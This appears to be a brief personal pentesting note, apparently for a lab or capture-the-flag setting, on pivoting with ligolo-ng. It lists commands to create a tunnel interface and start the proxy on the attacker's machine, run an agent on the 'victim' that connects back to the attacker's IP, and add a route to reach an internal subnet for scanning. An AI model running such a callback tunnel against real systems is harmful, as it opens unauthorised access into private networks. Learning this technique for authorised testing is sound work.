on linux:
```bash
sudo ip tuntap add user root mode tun ligolo

sudo ip link set ligolo up

sudo ~/tools/ligolo/proxy -selfcert
```

on the victim:
```bash
./agent -connect 10.10.17.138:11601 -ignore-cert

# attacker_ip:port_of_ligolo
```


adding route:
```bash
# put the interface you want to pivot in:
sudo ip route add 10.0.52.0/24 dev ligolo

#check
└─$ ip route list
default via 192.168.100.1 dev wlan0 proto dhcp src 192.168.100.11 metric 600
10.0.52.0/24 dev ligolo scope link linkdown



```

last step is to do `start` from the attacking machine
![[Pasted image 20250826024416.png]]

now we can run normal commands from the attacker machine. Nmap or anything

[ref](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)
